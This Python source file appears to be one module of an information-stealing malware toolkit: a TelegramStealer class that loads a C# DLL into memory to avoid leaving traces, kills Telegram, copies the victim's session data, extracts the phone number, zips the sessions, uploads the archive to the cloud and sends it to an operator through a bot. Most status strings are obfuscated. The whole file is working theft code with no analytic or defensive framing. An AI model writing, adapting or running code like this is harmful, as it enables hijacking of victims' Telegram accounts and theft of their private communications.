import os
import time
import re
import shutil
from typing import Any, Dict, List, Optional
from core.cloud import CloudModule
from core.obfuscation import decrypt_string

from core.base import BaseModule

try:
    import clr
    CLR_AVAILABLE = True
except ImportError:
    CLR_AVAILABLE = False

class TelegramStealer(BaseModule):
    """Native-first Telegram stealer using C# telegrab module (A-04)"""
    def __init__(self, bot=None, report_manager=None, temp_dir=None):
        super().__init__(bot, report_manager, temp_dir)
        self.appdata = os.environ.get('APPDATA', '')
        self.SafetyManager = None
        self._load_SafetyManager()
        self.last_result = {}

    def _load_SafetyManager(self):
        if not CLR_AVAILABLE:
            return
        try:
            from System.Reflection import Assembly
            from System.IO import File
            dll_name = "telegrab.dll"
            # Search in current dir, core/ and native_modules/
            search_paths = [
                os.path.join(os.path.dirname(__file__), dll_name),
                os.path.join(os.path.dirname(__file__), "..", "native_modules", dll_name),
                os.path.join(os.getcwd(), "native_modules", dll_name)
            ]
            
            for _p in search_paths:
                if os.path.exists(_p):
                    try:
                        # S-09: RAM-Only loading from byte array
                        raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
                         # We use Assembly.Load to avoid locking the file and keep it in RAM
                        Assembly.Load(raw_bytes)
                        from VanguardCore import TelegrabManager
                        self.SafetyManager = TelegrabManager
                        break
                    except: continue
        except:
            pass

    def run(self) -> bool:
        """A-04: Implementation of standardized run method."""
        try:
            self.log("Starting Telegram session extraction...")
            result = self.steal_sessions(status_callback=self.log)
            self.last_result = result
            
            if result.get('zip_path') and self.report_manager:
                caption = f"🛡️ Telegram Sessions ({len(result['sessions'])}found)"
                if result.get('phone'):
                    caption += f"\n📱 Phone: {result['phone']}"
                if result.get('cloud_link'):
                    caption += f"\n☁️ Cloud: {result['cloud_link']}"
                
                self.report_manager.safe_send_document(self.report_manager.admin_id, result['zip_path'], caption=caption)
            
            return True if result.get('sessions') else False
        except Exception as e:
            self.log(f"Telegram extraction failed: {e}")
            return False

    def get_stats(self) -> Dict[str, int]:
        return {"sessions": len(self.last_result.get("sessions", []))}

    def steal_sessions(self, status_callback=None) -> Dict[str, Any]:
        """
        Steals Telegram sessions, packs into ZIP using Python's shutil 
        and uploads to cloud for large archives.
        """
        result: Dict[str, Any] = {
            'sessions': [],
            'zip_path': None,
            'cloud_link': None,
            'phone': None,
            'has_passcode': False,
            'analysis': {},
            'details': {}
        }

        if not self.SafetyManager:
            if status_callback: status_callback(decrypt_string("vqyp457pidOKzbqISBkiNiISqNae5Hmy7afa6MHo5qvt4s67+4Hksuo="))
            return result

        try:
            # 1. Kill Telegram
            if status_callback: status_callback(decrypt_string("p9aG9YL7gc+awoXDieub7FcVMyk3JiIuJmd6bw==")) # Закрытие Telegram...
            tg_exe = self.SafetyManager.KillTelegram()
            time.sleep(1.0)

            # 2. Capture tdata
            if status_callback: status_callback(decrypt_string(decrypt_string("HgsZLHcICSc9J1haWWA+PgtrKEQnMjwwbEIyThl3Ex8UXxRTJR8KISMuBHIrYARPCURTKmULL1oyFCQNFRYfMBYHMBkiH2szagddcBNgMgAHfDcJeRo/WzJPGg8QClMS"))) # Захват данных...
            temp_tdata = os.path.join(self.temp_dir, decrypt_string("FVYdCDwoKRYFBB5KG1cBUklzAT59HA0vZ1BDRS1CDxQaGgwCIzR3FjMaDxBbEBs="))
            self.SafetyManager.CaptureTelegram(temp_tdata)

            if os.path.exists(temp_tdata):
                # 3. Analyze data
                analysis = self.analyze_telegram_data(temp_tdata)
                result['sessions'] = analysis['sessions']
                result['has_passcode'] = len(analysis.get('key_files', [])) > 0
                result['phone'] = self._get_phone_from_tdata(temp_tdata)
                result['details'] = analysis

                # 4. Zip (using Python's shutil for stability)
                if status_callback: status_callback(decrypt_string("vqKp65/UidqKxbqIo7+2wr+9WLv6gemy56fX6fno41pGaDE7Z393TA=="))
                zip_base = os.path.join(self.temp_dir, decrypt_string("GlYZHy8OPxc2GzVDG1cSUhpbFQ5gJTAPP19DEQ8="))
                zip_path = shutil.make_archive(zip_base, 'zip', temp_tdata)
                
                if os.path.exists(zip_path):
                    result['zip_path'] = zip_path
                    size_mb = os.path.getsize(zip_path) / (1024 * 1024)
                    result['analysis'] = {
                        'total_files': sum([len(files) for r, d, files in os.walk(temp_tdata)]),
                        'sessions': len(analysis['sessions']),
                        'size_mb': size_mb
                    }

                    # 5. Cloud Upload if > 45MB or explicitly requested
                    if size_mb > 45 or True: # Force cloud for reliability
                        if status_callback: status_callback(decrypt_string("vqWo257iiOKL9LqPooO2yk7iykue74nTisy6iKKDtsROGgMCICVxETMND2cfW08HTn86QmB/dw=="))
                        cloud_link = CloudModule.upload_file(zip_path, status_callback)
                        if cloud_link:
                            result['cloud_link'] = cloud_link

                # Cleanup temp folder
                shutil.rmtree(temp_tdata, ignore_errors=True)

            # 6. Restart Telegram
            if tg_exe and os.path.exists(tg_exe):
                if status_callback: status_callback(decrypt_string("vq2o3p/RideKwLqIooa3+b+zqNFuBTwOPxAYWR8XSFQ="))
                import subprocess
                subprocess.Popen([tg_exe], creationflags=0x00000008 | 0x00000200)

        except Exception as e:
            if status_callback: status_callback(decrypt_string("vqip657piOCKz7u/ooy3+76IqNuf3nmy5Kbi6Mrp16rU4shRbioqFihfDxEpA1NKM08="))
            print(decrypt_string("NRMlSxo0NQc9BQtVUnoKFRtWWDg6NDgOejIYSh1LXFoVVwU="))

        return result

    def _get_phone_from_tdata(self, tdata_path):
        key_file = os.path.join(tdata_path, decrypt_string("HCQvGjYgJC44"))
        if os.path.exists(key_file):
            try:
                with open(key_file, 'rb') as f:
                    data = f.read()
                    phone_match = re.search(decrypt_string('Rm4cEH9hdVNvCkM=').encode(), data)
                    if phone_match:
                        return phone_match.group(1).decode()
            except: pass
        return None

    def analyze_telegram_data(self, tdata_path: str) -> Dict[str, Any]:
        sessions: List[Dict[str, Any]] = []
        key_files: List[str] = []
        maps: List[str] = []
        settings_list: List[str] = []
        hex_pattern = re.compile(r'^[0-9A-F]{16}', re.IGNORECASE)
        try:
            items = os.listdir(tdata_path)
            for item in items:
                item_path = os.path.join(tdata_path, item)
                if os.path.isfile(item_path):
                    if item == decrypt_string("HCQvGjYgJC44"):
                        key_files.append(item)
                    elif hex_pattern.match(item) and len(item) == 17:
                        sessions.append({'name': item, 'size': os.path.getsize(item_path)})
                    elif 'map' in item.lower(): maps.append(item)
                    elif 'setting' in item.lower(): settings_list.append(item)
                elif os.path.isdir(item_path) and hex_pattern.match(item) and len(item) == 16:
                    sessions.append({'name': item, 'size': 0})
        except: pass
        return {'sessions': sessions, 'key_files': key_files, 'maps': maps, 'settings': settings_list}
